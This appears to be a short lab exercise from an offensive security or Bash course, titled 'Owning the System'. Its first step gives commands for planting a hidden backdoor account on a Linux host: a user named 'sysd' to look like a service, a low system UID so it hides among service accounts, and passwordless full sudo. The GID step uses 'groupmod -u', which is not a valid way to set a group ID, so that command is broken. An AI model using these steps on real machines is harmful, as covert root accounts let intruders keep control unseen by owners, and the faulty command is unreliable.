# Advanced Bash - Owning the System

Step 1: Shadow People
    1.	Create a secret user named sysd. Make sure this user doesn't have a home folder created:
    •	sudo useradd sysd

    2.	Give your secret user a password:
    •	sudo passwd sysd

    3.	Give your secret user a system UID < 1000:
    •	sudo usermod -u 400 sysd

    4.	Give your secret user the same GID:
    •	sudo groupmod -u 400 sysd

    5.	Give your secret user full sudo access without the need for a password:
        •	sudo visudo
    
    ![see photo](/images/picture1.png)